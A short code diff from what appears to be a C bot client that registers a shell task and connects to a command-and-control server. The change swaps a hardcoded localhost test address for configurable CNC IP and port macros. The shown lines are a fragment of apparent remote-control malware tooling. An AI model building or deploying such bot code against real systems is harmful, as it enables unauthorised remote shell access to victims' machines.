@@ -1,5 +1,6 @@
 #include <stdio.h>
 
+#include "lconfig.h"
 #include "lerror.h"
 #include "ltask.h"
 #include "bot.h"
@@ -22,7 +23,7 @@ int main(int argv, char **argc) {
     laikaT_newTask(&tService, 100, shellTask, (void*)bot);
 
     /* connect to test CNC */
-    laikaB_connectToCNC(bot, "127.0.0.1", "13337");
+    laikaB_connectToCNC(bot, LAIKA_CNC_IP, LAIKA_CNC_PORT);
 
     /* while connection is still alive, poll bot */
     while (laikaS_isAlive((&bot->peer->sock))) {
